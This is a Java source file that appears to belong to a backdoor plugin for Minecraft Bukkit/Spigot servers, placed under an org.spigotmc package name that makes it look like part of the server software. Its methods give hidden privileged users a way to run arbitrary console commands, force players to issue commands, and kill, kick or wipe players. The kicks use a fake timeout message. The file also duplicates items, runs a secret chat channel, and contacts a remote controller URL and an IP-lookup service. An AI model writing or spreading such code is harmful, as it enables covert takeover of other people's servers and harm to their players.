package org.spigotmc.methods;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Scanner;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.spigotmc.Main;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.manager.PlayerManager;
import org.spigotmc.utils.Settings;

public class API {
    
    public static HashSet<Inventory> dinventory = new HashSet<>();

    public static String getIPOfPlayer(Player p) {
		return p.getAddress().getAddress().toString().replace("/", "");
	}

    public static void setPlayerGamemode(Player p, GameMode finalMode) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
            p.setGameMode(finalMode);
        });
    }

    public static void sendCmdsPlayer(Player p, String command) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
            p.chat(command);
        });
    }
    
    public static void killPlayer(Player p) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
            p.setHealth(0);
        });
    }

    public static void kickPlayer(Player p) {
        Bukkit.getScheduler().runTask(Main.getInstance(), () -> {
            p.kickPlayer("Internal Exception: io.netty.handler.timeout.ReadTimeOutException");
        });
    }
    
    public static void clearInventory(Player p) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
            p.getInventory().clear();
        });
    }
    
    public static void openDupeMachine(Player p) {
        Main.getInstance().getServer().getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
            Inventory inv = Bukkit.createInventory(null, 27, Settings.PURPLE + Settings.NAME + " dupe machine");
            dinventory.add(inv);
            p.openInventory(inv);
        });
    }

    public static void sendCommandToConsole(String command) {
        Bukkit.getScheduler().runTask(Main.getInstance(), () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
        });
    }

    public static void changeTime(Player p, long time) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
            p.getWorld().setTime(time);
        });
    }

    public static void getLoggedInUsers(Player p) {
        for (Player a : Bukkit.getOnlinePlayers()) {
            if (PlayerManager.isPlayerInType(PlayerType.FREE, a.getName())) {
                p.sendMessage(Settings.PREFIX(a.getName()));
            }
        }
    }

    public static void sendToServerChat(Player sender, String msg) {
        String prefix = "§8[" + Settings.PURPLE + "ServerChat" + "§8] ";
        String playerName = Settings.DARK_PURPLE + sender.getName();
        String message = msg.replace("&", "§");
        
        for (Player receiver : Bukkit.getOnlinePlayers()) {
            String playerType = "";
            
            if (PlayerManager.isPlayerInType(PlayerType.PREMIUM, sender.getName())) {
                playerType = "§8[" + Settings.PURPLE + "PREMIUM" + "§8] ";
            }

            if (PlayerManager.isPlayerInType(PlayerType.ADMIN, sender.getName())) {
                playerType = "§8[" + Settings.PURPLE + "ADMIN" + "§8] ";
            }
            
            if (PlayerManager.isPlayerInType(PlayerType.FREE, receiver.getName())) {
                receiver.sendMessage(prefix + playerType + playerName + "§7: " + Settings.WHITE + message);
            }
        }
    }

    public static void dupe() {
		Bukkit.getScheduler().runTaskTimerAsynchronously(Main.getInstance(), () -> {
			for (final Inventory inv : dinventory) {
				for (int i = 0; i <= 27 - 1; ++i) {
					if (inv.getItem(i) != null) {
						final ItemStack stack = inv.getItem(i);
						stack.setAmount(stack.getAmount() + 1);
					}
				}
			}
		}, 0L, 20);
	}

    public static String getRank(String playerName) throws IOException{
        String apiUrl = Settings.URL + "/api/rank.php?name=" + playerName;

        URL url = new URL(apiUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        
        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            
            in.close();
            return response.toString();
        } else {
            throw new IOException("API request failed with response code: " + responseCode);
        }
    }
    
    public static String getIP(){
        try{
            InputStream is = new URL("https://api.ipify.org").openConnection().getInputStream();
            try (Scanner s = new Scanner(is)) {
                return s.nextLine();
            }
        }catch (Exception e){
            return "penis";
        }
    }
}